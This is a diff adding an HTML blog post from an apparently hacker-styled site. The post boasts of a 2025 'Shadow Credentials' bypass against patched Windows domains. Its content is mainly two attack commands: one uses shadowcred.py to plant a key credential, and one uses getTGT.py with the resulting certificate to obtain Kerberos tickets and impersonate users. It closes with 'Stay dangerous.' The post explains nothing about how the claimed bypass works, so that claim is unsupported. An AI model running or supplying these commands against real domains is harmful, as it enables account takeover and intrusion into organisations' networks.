@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow Credentials 2025 Bypass // h4ck3rfirst</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="terminal">
+            <div class="header">
+                <div><a href="../index.html" style="color:#0ff; text-decoration:none;">back</a> • h4ck3rfirst@darknet:~$ cat shadow-2025.md</div>
+                <button id="themeToggle" class="toggle">Dark/Light</button>
+            </div>
+            <div class="output post-content">
+                <h1>Shadow Credentials Still Own 2025 Domains</h1>
+                <p class="date">2025-11-20</p>
+                <br>
+                <p>Microsoft patched the "easy" version in 2023... but here's the 2025 bypass that works on fully patched domains.</p>
+                <br>
+                <pre>python3 shadowcred.py -u user@domain.local -p 'Password123!' --add</pre>
+                <p>Now authenticate as any user with the new certificate:</p>
+                <pre>getTGT.py -cert-pfx shadow.pfx domain/user</pre>
+                <br>
+                <p>Works on Windows Server 2025 + latest KDC patches.</p>
+                <p>Full writeup coming soon. Stay dangerous.</p>
+            </div>
+            <div class="cursor"></div>
+        </div>
+    </div>
+
+    <script>
+        const body = document.body;
+        const saved = localStorage.getItem('theme');
+        if (saved) body.classList.add(saved);
+        document.getElementById('themeToggle').addEventListener('click', () => {
+            body.classList.toggle('light');
+            localStorage.setItem('theme', body.classList.contains('light') ? 'light' : 'dark');
+        });
+    </script>
+</body>
+</html>
